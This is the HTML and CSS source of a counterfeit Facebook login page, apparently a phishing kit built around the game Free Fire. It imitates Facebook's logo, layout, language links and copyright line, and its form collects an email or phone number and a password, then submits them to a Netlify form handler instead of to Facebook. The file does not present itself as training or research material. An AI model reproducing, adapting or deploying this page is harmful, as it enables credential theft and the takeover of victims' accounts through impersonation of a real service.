<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>free fire</title>
</head>
<body>
    <center>
    <div class="popup-login facebook animated fadeIn" style="max-width: 530px;">
    
        <div class="popup-box-login-fb">
            <div class="navbar-fb" style="border-top-left-radius: 0px;border-top-right-radius: 0px;">
                <img src="https://files.site-fusion.co.uk/webfusion10421/image/20100831_facebook-logo.png">
            </div>
            <div class="content-box-fb">
                <img src="https://lh3.googleusercontent.com/akplCmyGhcKXySj_c-ODskbnlzLDwbcnT0wAJVl3Fm2WAK0wL5WYUT1-rw-I6IaDYOg" width="50">
                <div class="txt-login-fb">
                     Log in to your Facebook account to connect to FreeFire
                </div>
                <form   method="POST"
                name="habib"
                     action="box/index.html"
                netlify-honeypot="bot-field"
                data-netlify="true">
                    <input type="text" name="@@Email" class="inputFb" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="none" required="">
                    <input type="password" class="inputFb" name="@@Password" placeholder="Password" autocomplete="off" autocapitalize="none" required="">
                   
                    
                    
                    <button type="submit" class="btn-login-fb">Log In</button>
                </form>
                <div class="txt-create-account">Create account</div>
                <div class="txt-not-now">Not now</div>
                <div class="txt-forgotten-password">Forgotten password?</div>
            </div>
            <div class="language-box">
                <center>
                <div class="language-name language-name-active">English (UK)</div>
                <div class="language-name">Bahasa Indonesia</div>
                <div class="language-name">Basa Jawa</div>
                <div class="language-name">Bahasa Melayu</div>
                <div class="language-name">å,</div>
                <div class="language-name">Español</div>
                <div class="language-name">Português (Brasil)</div>
                <div class="language-name">
                    <i class="fa fa-plus"></i>
                </div>
                </center>
            </div>
            <div class="copyright">Facebook Inc.</div>
        </div>
    </div>
    
    </center>
    <style>
        .navbar-fb {
            background: #3b5998;
            width: 100%;
            height: auto;
            padding: 8px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }
        .navbar-fb img {
            width: 115px;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }
        .content-box-fb {
            width: 90%;
            height: auto;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }
        .content-box-fb img {
            width: 60px;
            margin-top: 20px;
            margin-left: auto;
            margin-right: auto;
            border-radius: 12px;
            display: block;
        }
        .txt-login-fb {
            width: 270px;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 17px;
            padding: 8px;
            color: #90949c;
            font-size: 16px;
            font-family: Roboto;
            text-align: center;
            display: block;
        }
        .inputFb {
            width: 100%;
            height: auto;
            padding: 12px;
            color: #000;
            font-size: 14px;
            font-weight: 400;
            font-family: 'Lato',sans-serif;
            border: 1px solid #bdbebf;
            cursor: pointer;
            outline: none;
        }
        .login-form input[type="text"] {
            margin: 0;
            padding-bottom: 13px;
            border-bottom: none;
            border-radius: 4px 4px 0 0;
            box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
        }
        .login-form input[type="password"] {
            margin: 0;
            border-top: none;
            border-radius: 0 0 4px 4px;
            box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
        }
        .btn-login-fb {
            background: #1778f2;
            width: 100%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            padding: 10px;
            color: #fff;
            font-size: 14px;
            font-family: Roboto;
            font-weight: bold;
            text-align: center;
            text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
            border: 1px solid #3578e5;
            border-radius: 5px;
            box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
            outline: none;
            display: block;
        }
        .txt-create-account {
            width: 100%;
            height: auto;
            padding: 5px;
            color: #3b5998;
            font-size: 13.5px;
            font-family: Roboto;
            text-align: center;
        }
        .txt-not-now {
            width: 100%;
            height: auto;
            padding: 5px;
            color: #3b5998;
            font-size: 13.5px;
            font-family: Roboto;
            text-align: center;
        }
        .txt-forgotten-password {
            width: 100%;
            height: auto;
            margin-bottom: 30px;
            padding: 5px;
            color: #7596c8;
            font-size: 13.5px;
            font-family: Roboto;
            text-align: center;
        }
        .language-box {
            width: 100%;
            height: auto;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }
        .language-name {
            width: 40%;
            height: auto;
            margin: 5px;
            margin-bottom: 0px;
            color: #3b5998;
            font-size: 12px;
            font-family: Roboto;
            text-align: center;
            display: inline-block;
        }
        .language-name i {
            width: 23px;
            padding: 4px;
            color: #90949c;
            border: 1px solid #3b5998;
            border-radius: 3px;
        }
        .language-name-active {
            color: #90949c;
            font-weight: bold;
        }
        .copyright {
            width: 40%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            color: #90949c;
            font-size: 12px;
            font-family: Roboto;
            text-align: center;
            display: block;
        }
        </style>
           
           

</body>
</html>
